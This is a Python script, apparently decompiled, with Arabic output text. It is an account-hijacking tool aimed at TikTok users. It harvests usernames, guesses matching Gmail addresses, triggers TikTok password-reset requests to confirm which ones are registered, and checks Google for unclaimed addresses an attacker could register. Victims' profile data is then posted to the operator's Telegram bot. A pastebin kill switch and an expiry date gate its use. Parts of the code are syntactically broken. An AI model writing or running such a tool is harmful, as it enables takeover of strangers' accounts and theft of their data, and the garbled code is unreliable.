

copyright = '@psh_team'
import requests
import random
import json
import threading
import datetime
from user_agent import generate_user_agent
X = '\x1b[4;33m'
F = '\x1b[2;32m'
Z = '\x1b[4;31m'
L = '\x1b[4;35m'
C = '\x1b[2;35m'
B = '\x1b[2;36m'
A = '\x1b[4;31m'
url12 = requests.get('https://pastebin.com/raw/aZMdkMzB').text
if '1' in url12:
    I = input(f'''{A}ENTAR ID : {X}''')
    T = input(f'''{A}ENTAR Token : {X}''')
    
    def fs():
        countr = [
            'KW',
            'SA',
            'IN',
            'EG',
            'IR',
            'YE',
            'IQ']
        country = random.choice(countr)
        country1 = random.choice(countr)
        if country == 'KW':
            num = 30
        elif country == 'IQ':
            num = 10
        elif country == 'SA':
            num = 15
        elif country == 'IN':
            num = 22
        elif country == 'EG':
            num = 32
        elif country == 'IR':
            num = 21
        elif country == 'YE':
            num = 12
        u = f'''https://www.tiktok.com/api/recommend/item_list/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&count={num}&device_id=7166382878086088234&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&language=ar&os=windows&priority_region={country}&referer=&region={country1}&screen_height=768&screen_width=1366&tz_name=Asia%2FBaghdad&webcast_language=ar&msToken=V4i0eWl1l4XXNGAUlAfYoNF-N9wq9E8HJ8vL0Vk2d9yR9kE6d8y-NZw7ViWU_jh-ca7dGEQC3DRYLmWvkbkcxagwW8wD20KzqekJ0xn7tF4lHcUfPnsB4rZFTVcHF9gtOZOX2Sgdkm4ITrNp&X-Bogus=DFSzswVYNHvANryXSDbnEcYklTI6&_signature=_02B4Z6wo00001YNx7rgAAIDAXQe2H-Lkar2DceoAAANief'''
        r = requests.get(u).json()
        e = len(str(r['itemList'][0]['author']['secUid']))
        for ip in range(0, e):
            
            try:
                g = str(r['itemList'][ip]['author']['uniqueId'])
                g1 = str(r['itemList'][ip]['author']['secUid'])
                u1 = f'''https://www.tiktok.com/api/user/list/?aid=1988&app_language=ar&app_name=tiktok_web&battery_info=1&browser_language=ar&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F108.0.0.0%20Mobile%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&count=30&device_id=7166382878086088234&device_platform=web_mobile&focus_state=true&from_page=user&history_len=3&is_fullscreen=false&is_page_visible=true&maxCursor=0&minCursor=0&os=android&priority_region=US&referer=&region=IQ&scene=67&screen_height=538&screen_width=487&secUid={g1}&tz_name=Asia%2FBaghdad&verifyFp=verify_lcqmc18o_2CWBYokU_ZXPv_4ELO_Ar31_aVH0oNd3tuZ7&webcast_language=ar&msToken=lV8flwO8eKtMWcrEAqcwI4cwiJfipA06jWgGUBRvtDb9Q4F9rabRgfhbeZLTUMBQ9kUxV8GT0Fdfry_vblsdo07d3mq1hmpXjvNuMCfTUpVF-1XP096J3F7FCg4WeKYqVM_O9b_5mnmS2SgYM7o=&X-Bogus=DFSzKwVuOtGANSQiSDbC9QYklT64&_signature=_02B4Z6wo00001BlS8SAAAIDBxySphzU2O3wZQvWAAGXv87'''
                r1 = requests.get(u1).json()
                e1 = 0
                e1 += 1
                
                try:
                    g = str(r1['userList'][e1]['user']['uniqueId'])
                    email = g + '@gmail.com'
                    
                    try:
                        url = 'https://api2-16-h2.musical.ly/aweme/v1/passport/find-password-via-email/?app_language=en&manifest_version_code=2018101933&_rticket=1640498724713&iid=7045258653545678597&channel=googleplay&language=en&fp=&device_type=JKM-LX1&resolution=1080*2137&openudid=12c019d2ff003ae0&update_version_code=2018101933&sys_region=US&os_api=28&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=408&carrier_region=IQ&ac=3g&device_id=6842870495047812614&mcc_mnc=41805&timezone_offset=10800&os_version=9&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HUAWEI&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=US&aid=1233&ts=1640498723&as=a1f6304c330281f6084477&cp=0e28166a3f85cd68e1OeWi&mas=011642394e9220eefdfcb08b2bbe4539f5ecec2c2c1c0c6c668c1c'
                        data = f'''app_language=en&manifest_version_code=2018101933&_rticket=1640498724713&iid=7045258653545678597&channel=googleplay&language=en&fp=&device_type=JKM-LX1&resolution=1080*2137&openudid=12c019d2ff003ae0&update_version_code=2018101933&sys_region=US&os_api=28&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=408&email={email}&retry_type=no_retry&carrier_region=IQ&ac=3g&device_id=6842870495047812614&mcc_mnc=41805&timezone_offset=10800&os_version=9&version_code=880&carrier_region_v2=418&app_name=musical_ly&ab_version=8.8.0&version_name=8.8.0&device_brand=HUAWEI&ssmix=a&pass-region=1&build_number=8.8.0&device_platform=android&region=US&aid=1233'''
                        af = requests.post(url, data, **('data',)).text
                    finally:
                        pass
                    if '"Sent successfully"' in af:
                        url = 'https://android.clients.google.com/setup/checkavail'
                        hed = {
                            'Content-Length': '98',
                            'Content-Type': 'text/plain; charset=UTF-8',
                            'Host': 'android.clients.google.com',
                            'Connection': 'Keep-Alive',
                            'user-agent': str(generate_user_agent()) }
                        data = json.dumps({
                            'username': email,
                            'version': '3',
                            'firstName': 'sarot',
                            'lastName': 'devtelegram' })
                        res = requests.post(url, data, hed, **('data', 'headers'))
                        if res.json()['status'] == 'SUCCESS':
                            url2 = f'''https://api.dlyar-dev.tk/info-tiktok.json?user={g}'''
                            req = requests.get(url2).json()
                            id = req['id']
                            us = req['user']
                            name = req['name']
                            fol = req['followers']
                            fols = req['following']
                            uid = req['uid']
                            likes = req['likes']
                            country = req['country']
                            info = f'''\n  ꕥꕥꕥꕥꕥꕥꕥꕥꕥꕥꕥꕥ\n  ☠ اسم الحساب:{name}\n  ☠ اليوزر:{us}\n  ☠ الايميل: {g}@gmail.com\n  ☠ uid:{id}\n  ☠ عدد المتابعون :{fol}\n  ☠ عدد اليتابعهم:{fols}\n  ☠ عدد الايكات:{likes}\n  ☠ country:{country}\n   tele : @J_C_A\n \n    '''
                            print(F + info)
                            requests.post(f'''https://api.telegram.org/bot{T}/sendMessage?chat_id={I}&text={info}''')
                        else:
                            print(Z + f''' EROOR GMAIL  : {email}''')
                    elif 'fatal_item_ids' in af:
                        print(X + f'''EROOR TIK  : {email}''')
                    fs()
                    continue
                    continue
                    fs()
                    continue
                    continue
                    return None




    prox_list = []
    for i in range(5):
        t = threading.Thread(fs, **('target',))
        t.start()
        prox_list.append(t)
else:
    
    def hello():
        x = datetime.datetime.now()
        g = datetime.datetime(2023, 2, 28, 0, 0, 0)
        if x > g or x == g:
            print(Z + '\n\n تم ايقاف الاداة.')
            s = '• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •\n • لتفعيل الادات راسل المطوره .\n• ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ •'
            print(F + s)
            print(X + '@J_C_A')
            exit()

    hello()

